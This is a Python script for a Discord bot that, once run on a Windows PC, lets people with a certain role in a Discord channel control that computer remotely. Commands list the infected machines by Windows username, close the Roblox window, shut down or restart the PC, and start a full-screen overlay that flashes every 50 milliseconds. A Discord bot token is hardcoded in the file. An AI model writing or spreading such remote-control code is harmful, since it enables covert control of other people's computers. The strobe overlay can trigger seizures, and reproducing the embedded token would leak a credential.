import os
import tkinter as tk
import pygetwindow as gw
import discord
from discord.ext import commands
from threading import Thread, Event

# Replace this with your actual Discord bot token
TOKEN = "MTMxMjA2MDM0MzQyOTYyNzkxNA.GHsJma.B6HKlVBlYyjE3JwEjZysHxIZ2L_xg2pDXMqL4k"

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix="?", intents=intents)

COMMAND_CHANNEL_ID = 1282705575930761216
ALLOWED_ROLE_ID = 1325119321361350656

users_running_script = {}  # Dictionary to track users by their Windows username
flashing_users = {}  # Track flashing status for users


def get_windows_user():
    """Fetches the Windows username of the current user."""
    return os.getlogin()


def create_flash_overlay(stop_event):
    """
    Creates a full-screen overlay that alternates between white and black
    continuously until the stop_event is set.
    """
    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.attributes("-transparentcolor", "black")
    root.configure(bg="black")

    def flash():
        if not stop_event.is_set():
            root.configure(bg="white" if root["bg"] == "black" else "black")
            root.after(50, flash)
        else:
            root.destroy()

    flash()
    root.mainloop()


def close_roblox_window():
    """
    Closes the window titled 'Roblox' if it's open.
    """
    try:
        windows = gw.getWindowsWithTitle("Roblox")
        for window in windows:
            print(f"Closing window: {window.title}")
            window.close()
    except Exception as e:
        print(f"Error closing Roblox window: {e}")


@bot.event
async def on_ready():
    print(f"We have logged in as {bot.user}")
    windows_user = get_windows_user()
    users_running_script[windows_user] = {"discord_user": bot.user.name}  # Save the associated Discord user name
    print(f"User {windows_user} registered.")


async def check_user_permissions(ctx):
    """Check if the user has the correct role and is in the correct channel."""
    if ctx.message.channel.id != COMMAND_CHANNEL_ID:
        await ctx.send("This command can only be used in the designated command channel.")
        return False

    if not any(role.id == ALLOWED_ROLE_ID for role in ctx.message.author.roles):
        await ctx.send("You need the required role to use this command.")
        return False

    return True


@bot.command()
async def users(ctx):
    """Show all users running the script."""
    if await check_user_permissions(ctx):
        if not users_running_script:
            await ctx.send("No users are currently running the script.")
        else:
            user_list = "\n".join(
                [f"{username} (Discord: {info['discord_user'] or 'Unknown'})" for username, info in users_running_script.items()]
            )
            await ctx.send(f"Users running the script:\n{user_list}")


@bot.command()
async def FlashOn(ctx, user: str):
    """Start flashing the screen for a specific user."""
    if await check_user_permissions(ctx):
        if user in users_running_script:
            if user in flashing_users and flashing_users[user].is_set():
                await ctx.send(f"{user} is already flashing.")
            else:
                stop_event = Event()
                flashing_users[user] = stop_event
                Thread(target=create_flash_overlay, args=(stop_event,)).start()
                await ctx.send(f"Flashing started for {user}.")
        else:
            await ctx.send(f"User {user} is not currently running the script.")


@bot.command()
async def FlashOff(ctx, user: str):
    """Stop flashing the screen for a specific user."""
    if await check_user_permissions(ctx):
        if user in flashing_users and not flashing_users[user].is_set():
            flashing_users[user].set()
            await ctx.send(f"Flashing stopped for {user}.")
        else:
            await ctx.send(f"{user} is not currently flashing.")


@bot.command()
async def CloseRoblox(ctx, user: str):
    """Close the Roblox window for a specific user."""
    if await check_user_permissions(ctx):
        if user in users_running_script:
            close_roblox_window()
            await ctx.send(f"Successfully closed Roblox window for {user}.")
        else:
            await ctx.send(f"User {user} is not currently running the script.")


@bot.command()
async def Shutdown(ctx, user: str):
    """Shut down the PC for a specific user."""
    if await check_user_permissions(ctx):
        if user in users_running_script:
            await ctx.send(f"Shutting down {user}'s PC...")
            os.system("shutdown /s /t 1")
        else:
            await ctx.send(f"User {user} is not currently running the script.")


@bot.command()
async def Restart(ctx, user: str):
    """Restart the PC for a specific user."""
    if await check_user_permissions(ctx):
        if user in users_running_script:
            await ctx.send(f"Restarting {user}'s PC...")
            os.system("shutdown /r /t 1")
        else:
            await ctx.send(f"User {user} is not currently running the script.")


# Start the bot
bot.run(TOKEN)
